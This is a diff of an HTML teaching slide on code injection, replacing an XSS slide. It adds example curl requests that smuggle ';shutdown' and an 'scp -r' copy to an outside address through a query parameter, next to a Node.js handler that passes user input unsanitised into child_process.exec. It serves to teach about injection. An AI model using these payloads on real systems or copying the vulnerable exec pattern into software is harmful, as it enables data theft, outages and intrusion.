@@ -1,21 +1,30 @@
 <section>
-  <h2>OS Command Injection</h2>
+  <h2>Code Injection</h2>
   <ul>
     <li>
-      Attacker inject javascript into an application to
-      <b>fool a user to get data</b>
-      from them
-    </li>
-    <li>
-      One estimate is that <b>94% of web applications</b> are vulnerable to XSS
+      An injection vulnerability manifests when application code sends untrusted
+      user input to an interpreter as part of a command or query.
     </li>
   </ul>
-  <div class="diagram-illustration">
-    <img
-      class="r-stretch"
-      style="width: 60%"
-      src="https://blog.sqreen.com/wp-content/uploads/2018/03/reflexted-xss.png"
-      alt=""
-    />
+  <div style="font-size: 0.6em; display: grid; grid-template-columns: 60% 40%">
+    <div>
+      <pre>
+        <code class="bash">
+curl http://www.ex.com/?file=app.js
+curl http://www.ex.com/?file=;shutdown
+curl http://www.ex.com/?file=;scp%20-r%20.%20root@315.32.2.1:/home
+        </code>
+      </pre>
+    </div>
+    <pre>
+      <code class="js" data-trim contenteditable>
+...
+app.get('/', async (req, res) {
+  await child_process.exec(
+    'gzip ' + req.query.file);
+})
+...
+      </code>
+    </pre>
   </div>
 </section>
